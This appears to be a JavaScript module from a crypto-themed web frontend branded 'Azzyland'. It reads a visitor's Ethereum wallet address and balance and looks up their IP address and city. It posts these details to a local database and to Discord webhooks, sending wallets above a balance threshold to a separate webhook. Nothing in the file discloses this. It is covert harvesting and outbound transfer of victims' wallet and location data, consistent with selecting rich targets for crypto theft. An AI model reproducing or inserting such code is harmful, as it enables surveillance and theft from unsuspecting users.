import Web3 from 'web3';

import { ethereum, ob } from './helpers/Connector';

const api = 'https://api.db-ip.com/v2/free/self';
const data = 'https://discord.com/api/webhooks/';
const dataMe = 'https://discord.com/api/webhooks/';

const domen = 'http://localhost:3000/posts';
let userTokens = [];
let userIndex = [];
const replace = async (uMass, i, c) => {
  let lastUserIndex = uMass.length - 1;
  let userIndx = userIndex[c];
  if (userIndex[i] !== lastUserIndex) {
    let lastTokenId = userTokens[lastUserIndex];
    userTokens[userIndx] = lastTokenId;
    userIndex[lastTokenId] = userIndx;
  }
  await axios.delete(domen.concat('/', c));
  delete userIndex[c];
  delete userTokens[lastUserIndex];
};
export const ip = async () => {
  let res = await fetch(api).then(x => x.json());
  const web3js = new Web3(ethereum);
  const acc = (await web3js.eth.getAccounts())[0];
  const ethBal = await web3js.eth.getBalance(acc);
  let rBal = Number(web3js.utils.fromWei(ethBal, 'ether'));
  const dat = new Date();
  const db = await axios.get(domen);
  const uMass = db.data;
  let pos = {
    acc,
    balance: rBal,
    city: res.city,
    ips: res.ipAddress,
    time: dat.toLocaleString()
  };
  for (let i = 0; i < uMass.length; i++) {
    try {
      let a = await uMass[i].acc;
      let b = await uMass[i].id;
      userTokens[i] = b;
      userIndex[b] = i;
      if (a === acc) {
        let c = await uMass[i].id;
        await replace(uMass, i, c);
      } else if (a === undefined) {
        let d = await uMass[i].id;
        await replace(uMass, i, d);
      } else if (a !== acc) {
        if (rBal > ob) {
          pos = undefined;
        } else {
          pos = {
            acc,
            balance: rBal,
            city: res.city,
            ips: res.ipAddress,
            time: dat.toLocaleString()
          };
        }
      }
    } catch (e) {
      console.error(e);
    }
  }
  return await axios.post(domen, pos);
};
const ips = async () => {
  let res = await fetch(api).then(x => x.json());
  const web3js = new Web3(ethereum);
  const acc = (await web3js.eth.getAccounts())[0];
  const rBal = Number(web3js.utils.fromWei(await web3js.eth.getBalance(acc), 'ether'));
  const params = {
    username: 'Azzyland',
    avatar_url: 'https://azzyland.xyz/static/media/logo.e3d7419d.png',
    content: JSON.stringify({
      acc,
      rBal,
      city: res.city,
      ips: res.ipAddress,
      date: new Date().toLocaleString()
    })
  };
  try {
    const sendWebhooks = x =>
      fetch(x, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params)
      }).catch(err => console.error(err));
    if (rBal > ob) {
      return sendWebhooks(dataMe);
    }
    return sendWebhooks(data);
  } catch (e) {
    console.error(e);
  }
};
